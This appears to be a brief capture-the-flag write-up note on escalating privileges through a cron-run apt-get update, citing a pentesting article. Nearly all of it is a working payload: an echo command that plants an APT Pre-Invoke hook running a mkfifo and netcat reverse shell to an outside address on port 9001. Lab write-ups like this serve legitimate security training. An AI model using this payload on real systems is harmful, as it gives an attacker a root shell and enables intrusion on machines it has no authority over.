# SSH

# Apt-get update

apt-get update is running on cron

So we can abuse, and wait for a shell:

```bash
john@writer:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.179 9001 >/tmp/f"};' > pwn
```

Source: https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
